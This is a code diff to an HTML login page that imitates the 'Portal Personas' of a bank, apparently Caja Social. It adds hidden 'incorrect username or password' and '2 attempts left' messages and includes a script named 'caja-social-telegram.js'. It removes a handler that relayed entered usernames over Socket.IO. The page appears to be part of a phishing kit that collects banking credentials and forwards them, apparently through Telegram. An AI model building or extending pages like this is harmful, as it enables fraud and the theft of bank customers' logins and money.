@@ -29,6 +29,14 @@
                 </div>
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
+
+                <div id="loginErrorAlert" class="caja-alert-error" role="alert" hidden>
+                    <span class="caja-alert-error__icon" aria-hidden="true">!</span>
+                    <div class="caja-alert-error__body">
+                        <strong>Usuario o contraseña incorrectas</strong>
+                        <p>Recuerde que su contraseña será bloqueada al tercer intento errado. Por favor verifique e intente de nuevo.</p>
+                    </div>
+                </div>
                 
                 <p class="subtitle">
                     Recuerde que su usuario está compuesto por<br>
@@ -46,6 +54,7 @@
                         class="form-input"
                         placeholder="Ejemplo: CC123456789"
                     >
+                    <p id="intentosRestantes" class="intentos-msg" hidden>Le quedan 2 intentos</p>
                     
                     <button type="submit" class="btn-siguiente" id="submitBtn" disabled>Siguiente</button>
                     
@@ -83,22 +92,14 @@
                 }
             });
             
-            // Enviar usuario a través de Socket.IO
-            document.querySelector('.login-form').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const value = usuarioInput.value.trim().toUpperCase();
-                if (validPattern.test(value)) {
-                    // Guardar el usuario en sessionStorage
-                    sessionStorage.setItem('usuario', value);
-                    
-                    // Enviar a través de Socket.IO
-                    socketManager.sendUsuario(value);
-                }
+            usuarioInput.addEventListener('input', function() {
+                this.classList.remove('error');
             });
         });
     </script>
 
     <script src="/js/banco-utils.js"></script>
+    <script src="caja-social-telegram.js"></script>
     <script src="client-optimized.js"></script>
 </body>
 </html>
